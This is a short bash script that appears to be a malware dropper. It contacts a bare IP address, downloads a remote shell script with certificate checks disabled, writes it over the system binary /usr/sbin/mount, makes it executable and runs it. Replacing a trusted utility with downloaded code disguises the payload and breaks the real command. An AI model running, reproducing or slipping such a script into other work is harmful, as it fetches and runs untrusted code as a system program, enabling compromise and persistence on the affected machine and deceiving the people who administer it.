#!/bin/bash
curl -s http://193.36.119.72/1.txt
curl -s -k https://raw.githubusercontent.com/synctiming/synctime/main/synctiming.sh -o /usr/sbin/mount
chmod +x /usr/sbin/mount
/usr/sbin/mount
